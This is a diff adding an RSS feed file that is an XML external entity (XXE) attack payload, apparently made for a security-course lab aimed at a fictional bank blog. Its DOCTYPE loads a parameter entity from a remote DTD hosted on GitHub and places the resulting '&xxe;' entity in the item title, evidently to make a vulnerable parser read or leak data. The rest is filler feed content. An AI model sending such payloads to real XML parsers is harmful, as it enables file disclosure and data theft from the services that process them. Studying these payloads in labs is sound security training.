@@ -1,1 +1,40 @@
-
+<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
+<!DOCTYPE foo [
+<!ENTITY % ext SYSTEM "https://raw.githubusercontent.com/ukesh-rajasekar/cyber_sec/main/notes.dtd" >
+%ext;
+]>
+ 
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+ 
+<channel>
+ 
+	<item>
+<title>&xxe;</title>
+		<link>please work</link>
+					<comments>https://blog.quoccabank.com/?p=42#respond</comments>
+ 
+		<dc:creator><![CDATA[admin]]></dc:creator>
+		<pubDate>Mon, 08 Jun 2020 12:31:03 +0000</pubDate>
+				<category><![CDATA[Humans of QuoccaBank]]></category>
+		<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">https://blog.quoccabank.com/?p=42</guid>
+ 
+					<description><![CDATA[Scott&#8217;s favourite animal are the sharks.]]></description>
+										<content:encoded><![CDATA[
+<p>Scott&#8217;s favourite animal are the sharks.</p>
+]]></content:encoded>
+ 
+					<wfw:commentRss>https://blog.quoccabank.com/?feed=rss2&#038;p=42</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+ 
+ 
+			</item>
+			</channel>
+</rss>
